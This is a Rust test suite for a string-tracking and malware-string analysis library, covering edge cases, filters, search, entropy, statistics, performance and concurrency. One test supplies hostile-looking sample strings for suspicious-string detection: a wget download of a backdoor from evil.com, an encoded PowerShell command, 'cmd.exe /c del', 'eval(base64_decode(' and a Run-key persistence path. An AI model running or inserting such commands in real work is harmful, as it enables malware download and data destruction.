//! Comprehensive tests for threatflux-string-analysis

use threatflux_string_analysis::{StringContext, StringFilter, StringTracker};

#[test]
fn test_string_tracking_edge_cases() {
    let tracker = StringTracker::new();

    // Test empty string
    let result = tracker.track_string(
        "",
        "/test/file",
        "hash123",
        "test_tool",
        StringContext::FileString { offset: Some(0) },
    );
    assert!(result.is_ok(), "Empty string should be handled gracefully");

    // Test very long string
    let long_string = "A".repeat(10000);
    let result = tracker.track_string(
        &long_string,
        "/test/file",
        "hash123",
        "test_tool",
        StringContext::FileString { offset: Some(0) },
    );
    assert!(result.is_ok(), "Long string should be handled");

    // Test string with special characters
    let special_string = "Hello\x00World\n\t\r";
    let result = tracker.track_string(
        special_string,
        "/test/file",
        "hash123",
        "test_tool",
        StringContext::FileString { offset: Some(0) },
    );
    assert!(
        result.is_ok(),
        "String with special characters should be handled"
    );

    // Test Unicode string
    let unicode_string = "Hello 世界 🌍";
    let result = tracker.track_string(
        unicode_string,
        "/test/file",
        "hash123",
        "test_tool",
        StringContext::FileString { offset: Some(0) },
    );
    assert!(result.is_ok(), "Unicode string should be handled");
}

#[test]
fn test_duplicate_string_handling() {
    let tracker = StringTracker::new();

    let test_string = "duplicate test string";

    // Track the same string multiple times
    for i in 0..5 {
        tracker
            .track_string(
                test_string,
                &format!("/test/file{}", i),
                &format!("hash{}", i),
                "test_tool",
                StringContext::FileString {
                    offset: Some(i * 100),
                },
            )
            .unwrap();
    }

    // Should still be one unique string
    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, 1);
    assert_eq!(stats.total_occurrences, 5);

    // Get details to verify all occurrences are tracked
    let details = tracker.get_string_details(test_string).unwrap();
    assert_eq!(details.occurrences.len(), 5);
    assert_eq!(details.unique_files.len(), 5);
}

#[test]
fn test_batch_string_tracking() {
    let tracker = StringTracker::new();

    let strings = vec![
        "string1".to_string(),
        "string2".to_string(),
        "string3".to_string(),
        "duplicate".to_string(),
        "duplicate".to_string(), // Intentional duplicate
    ];

    tracker
        .track_strings_from_results(&strings, "/test/batch", "batch_hash", "batch_tool")
        .unwrap();

    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, 4); // 4 unique strings
    assert_eq!(stats.total_occurrences, 5); // 5 total occurrences

    // Verify duplicate handling
    let duplicate_details = tracker.get_string_details("duplicate").unwrap();
    assert_eq!(duplicate_details.occurrences.len(), 2);
}

#[test]
fn test_context_preservation() {
    let tracker = StringTracker::new();

    // Test different context types
    let contexts = vec![
        (
            "http://example.com",
            StringContext::Url {
                protocol: Some("http".to_string()),
            },
        ),
        (
            "/usr/bin/test",
            StringContext::Path {
                path_type: "executable".to_string(),
            },
        ),
        (
            "HKEY_LOCAL_MACHINE",
            StringContext::Registry {
                hive: Some("HKLM".to_string()),
            },
        ),
        (
            "CreateProcessA",
            StringContext::Import {
                library: "kernel32.dll".to_string(),
            },
        ),
        (
            "192.168.1.1",
            StringContext::Other {
                category: "ip_address".to_string(),
            },
        ),
        (
            "test@example.com",
            StringContext::Other {
                category: "email".to_string(),
            },
        ),
        (
            "secret_password",
            StringContext::Other {
                category: "credential".to_string(),
            },
        ),
        (
            "random_string",
            StringContext::FileString { offset: Some(1024) },
        ),
    ];

    for (string, context) in contexts {
        tracker
            .track_string(
                string,
                "/test/context",
                "context_hash",
                "context_tool",
                context.clone(),
            )
            .unwrap();

        let details = tracker.get_string_details(string).unwrap();
        assert_eq!(details.occurrences.len(), 1);

        // Verify context is preserved (implementation specific)
        // This test verifies that the tracking succeeds with different contexts
    }
}

#[test]
fn test_filtering_capabilities() {
    let tracker = StringTracker::new();

    // Track strings with different characteristics
    let test_strings = vec![
        ("short", 1),                // Short string
        ("medium_length_string", 1), // Medium length
        (
            "very_long_string_that_exceeds_normal_limits_for_testing_purposes",
            1,
        ), // Long
        ("repeated_string", 5),      // High occurrence
    ];

    for (string, count) in test_strings {
        for i in 0..count {
            tracker
                .track_string(
                    string,
                    &format!("/test/filter{}", i),
                    &format!("filter_hash{}", i),
                    "filter_tool",
                    StringContext::FileString {
                        offset: Some(i * 10),
                    },
                )
                .unwrap();
        }
    }

    // Test length filters
    let short_filter = StringFilter {
        min_length: Some(1),
        max_length: Some(10),
        ..Default::default()
    };
    let short_stats = tracker.get_statistics(Some(&short_filter));
    assert!(short_stats.total_unique_strings > 0);

    // Test occurrence filters
    let high_occurrence_filter = StringFilter {
        min_occurrences: Some(3),
        ..Default::default()
    };
    let high_occurrence_stats = tracker.get_statistics(Some(&high_occurrence_filter));
    assert_eq!(high_occurrence_stats.total_unique_strings, 1); // Only "repeated_string"

    // Test entropy filter (if implemented)
    let entropy_filter = StringFilter {
        min_entropy: Some(2.0),
        ..Default::default()
    };
    let entropy_stats = tracker.get_statistics(Some(&entropy_filter));
    // Check that entropy filtering works
    assert!(entropy_stats.total_unique_strings < 100); // Should be reasonable number
}

#[test]
fn test_search_functionality() {
    let tracker = StringTracker::new();

    // Track a variety of strings
    let search_strings = vec![
        "apple",
        "application",
        "apply",
        "banana",
        "band",
        "orange",
        "organize",
    ];

    for string in &search_strings {
        tracker
            .track_string(
                string,
                "/test/search",
                "search_hash",
                "search_tool",
                StringContext::FileString { offset: None },
            )
            .unwrap();
    }

    // Test prefix search
    let app_results = tracker.search_strings("app", 10);
    assert!(app_results.len() >= 3); // apple, application, apply

    // Test exact match
    let exact_results = tracker.search_strings("banana", 10);
    assert_eq!(exact_results.len(), 1);
    assert_eq!(exact_results[0].value, "banana");

    // Test case sensitivity (implementation dependent)
    let _case_results = tracker.search_strings("APPLE", 10);
    // Results depend on implementation - either case sensitive or insensitive

    // Test limit enforcement
    let limited_results = tracker.search_strings("a", 2);
    assert!(limited_results.len() <= 2);
}

#[test]
fn test_related_strings() {
    let tracker = StringTracker::new();

    // Track related strings (e.g., from same file)
    let related_strings = vec!["kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll"];

    for string in &related_strings {
        tracker
            .track_string(
                string,
                "/malware.exe", // Same file
                "malware_hash",
                "pe_parser",
                StringContext::Import {
                    library: string.to_string(),
                },
            )
            .unwrap();
    }

    // Track unrelated string
    tracker
        .track_string(
            "Hello World",
            "/readme.txt",
            "readme_hash",
            "text_parser",
            StringContext::FileString { offset: None },
        )
        .unwrap();

    // Find related strings
    let related = tracker.get_related_strings("kernel32.dll", 10);

    // Should find other DLLs from the same file
    assert!(related.len() >= 1);

    // Verify relationships (implementation specific logic)
    for (related_string, _score) in related {
        // Related strings should have some connection
        let details = tracker.get_string_details(&related_string).unwrap();
        assert!(!details.unique_files.is_empty());
    }
}

#[test]
fn test_statistics_accuracy() {
    let tracker = StringTracker::new();

    // Track known set of strings
    let test_data = vec![
        ("short", 1),
        ("medium_string", 2),
        ("long_string_for_testing_purposes", 3),
        ("url_like_string.com", 1),
        ("path/to/file", 1),
    ];

    let mut total_occurrences = 0;
    let total_unique = test_data.len();

    for (string, count) in &test_data {
        total_occurrences += count;
        for i in 0..*count {
            tracker
                .track_string(
                    string,
                    &format!("/test/{}", i),
                    &format!("hash{}", i),
                    "stats_tool",
                    StringContext::FileString {
                        offset: Some(i * 100),
                    },
                )
                .unwrap();
        }
    }

    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, total_unique);
    assert_eq!(stats.total_occurrences, total_occurrences);
    assert!(stats.total_files_analyzed > 0);

    // Test length distribution
    assert!(stats.length_distribution.len() > 0);

    // Test category distribution
    assert!(stats.category_distribution.len() > 0);
}

#[test]
fn test_entropy_calculation() {
    let tracker = StringTracker::new();

    // Track strings with different entropy levels
    let entropy_tests = vec![
        ("aaaaaaaaaa", "Low entropy (repeated characters)"),
        ("abcdefghij", "Medium entropy (sequence)"),
        ("k8Jq3nP9xR", "High entropy (random-like)"),
        ("Hello World", "Normal entropy (text)"),
        ("01010101", "Low entropy (pattern)"),
    ];

    for (string, description) in entropy_tests {
        tracker
            .track_string(
                string,
                "/test/entropy",
                "entropy_hash",
                "entropy_tool",
                StringContext::FileString { offset: None },
            )
            .unwrap();

        let details = tracker.get_string_details(string).unwrap();

        // Entropy should be calculated (non-negative)
        assert!(
            details.entropy >= 0.0,
            "Entropy should be non-negative for: {}",
            description
        );
        assert!(
            details.entropy <= 8.0,
            "Entropy should not exceed theoretical maximum for: {}",
            description
        );
    }
}

#[test]
fn test_suspicious_detection_patterns() {
    let tracker = StringTracker::new();

    // Test various suspicious patterns
    let suspicious_patterns = vec![
        ("http://malware.com/payload.exe", "Suspicious URL"),
        (
            "powershell.exe -EncodedCommand",
            "PowerShell encoded command",
        ),
        ("CreateRemoteThread", "Process injection API"),
        (
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Persistence registry key",
        ),
        ("cmd.exe /c del", "Destructive command"),
        ("wget http://evil.com/backdoor", "Download command"),
        ("eval(base64_decode(", "Obfuscated code"),
        ("123.45.67.89:4444", "Suspicious IP:Port"),
    ];

    let benign_patterns = vec![
        ("Hello World", "Normal text"),
        ("example.com", "Benign domain"),
        ("C:\\Program Files\\", "Standard path"),
        ("kernel32.dll", "System library"),
    ];

    // Track suspicious strings
    for (string, _description) in &suspicious_patterns {
        tracker
            .track_string(
                string,
                "/malware.exe",
                "malware_hash",
                "malware_tool",
                StringContext::FileString { offset: None },
            )
            .unwrap();
    }

    // Track benign strings
    for (string, _description) in &benign_patterns {
        tracker
            .track_string(
                string,
                "/benign.txt",
                "benign_hash",
                "benign_tool",
                StringContext::FileString { offset: None },
            )
            .unwrap();
    }

    // Filter for suspicious strings only
    let suspicious_filter = StringFilter {
        suspicious_only: Some(true),
        ..Default::default()
    };

    let suspicious_stats = tracker.get_statistics(Some(&suspicious_filter));

    // Should detect some suspicious strings
    assert!(suspicious_stats.total_unique_strings > 0);
    assert!(suspicious_stats.suspicious_strings.len() > 0);

    // Verify specific suspicious strings are detected
    for suspicious_string in &suspicious_stats.suspicious_strings {
        let is_in_suspicious_patterns = suspicious_patterns
            .iter()
            .any(|(pattern, _)| pattern == suspicious_string);
        assert!(
            is_in_suspicious_patterns,
            "String '{}' should be marked as suspicious",
            suspicious_string
        );
    }
}

#[test]
fn test_performance_with_large_dataset() {
    let tracker = StringTracker::new();

    // Generate a large number of strings
    let num_strings = 10000;
    let strings: Vec<String> = (0..num_strings)
        .map(|i| format!("test_string_{:06}", i))
        .collect();

    let start_time = std::time::Instant::now();

    // Track all strings
    for (i, string) in strings.iter().enumerate() {
        tracker
            .track_string(
                string,
                &format!("/test/perf/{}", i % 100), // 100 different files
                &format!("hash_{}", i),
                "perf_tool",
                StringContext::FileString { offset: Some(i) },
            )
            .unwrap();
    }

    let tracking_time = start_time.elapsed();

    // Performance should be reasonable
    assert!(
        tracking_time.as_secs() < 10,
        "Tracking {} strings should complete in under 10 seconds",
        num_strings
    );

    // Verify statistics
    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, num_strings);
    assert_eq!(stats.total_occurrences, num_strings);

    // Test search performance
    let search_start = std::time::Instant::now();
    let search_results = tracker.search_strings("test_string_00", 100);
    let search_time = search_start.elapsed();

    assert!(
        search_time.as_millis() < 1000,
        "Search should complete in under 1 second"
    );
    assert!(
        !search_results.is_empty(),
        "Search should find matching strings"
    );
}

#[test]
fn test_concurrent_access() {
    use std::sync::Arc;
    use std::thread;

    let tracker = Arc::new(StringTracker::new());
    let num_threads = 4;
    let strings_per_thread = 1000;

    let mut handles = vec![];

    for thread_id in 0..num_threads {
        let tracker_clone = Arc::clone(&tracker);
        let handle = thread::spawn(move || {
            for i in 0..strings_per_thread {
                let string = format!("thread_{}_{}", thread_id, i);
                tracker_clone
                    .track_string(
                        &string,
                        &format!("/test/thread/{}", thread_id),
                        &format!("hash_{}_{}", thread_id, i),
                        "concurrent_tool",
                        StringContext::FileString { offset: Some(i) },
                    )
                    .unwrap();
            }
        });
        handles.push(handle);
    }

    // Wait for all threads to complete
    for handle in handles {
        handle.join().unwrap();
    }

    // Verify all strings were tracked
    let stats = tracker.get_statistics(None);
    assert_eq!(stats.total_unique_strings, num_threads * strings_per_thread);
    assert_eq!(stats.total_occurrences, num_threads * strings_per_thread);
}

#[test]
fn test_memory_management() {
    let tracker = StringTracker::new();

    // Track and release many strings to test memory management
    for iteration in 0..100 {
        let strings: Vec<String> = (0..1000)
            .map(|i| format!("iteration_{}_{}", iteration, i))
            .collect();

        for string in &strings {
            tracker
                .track_string(
                    string,
                    "/test/memory",
                    "memory_hash",
                    "memory_tool",
                    StringContext::FileString { offset: None },
                )
                .unwrap();
        }

        // Get statistics to ensure data is accessible
        let stats = tracker.get_statistics(None);
        assert!(stats.total_unique_strings > 0);

        // Clear or reset if such functionality exists
        // This test verifies that repeated operations don't cause memory issues
    }

    // Final verification
    let final_stats = tracker.get_statistics(None);
    assert!(final_stats.total_unique_strings > 0);
}
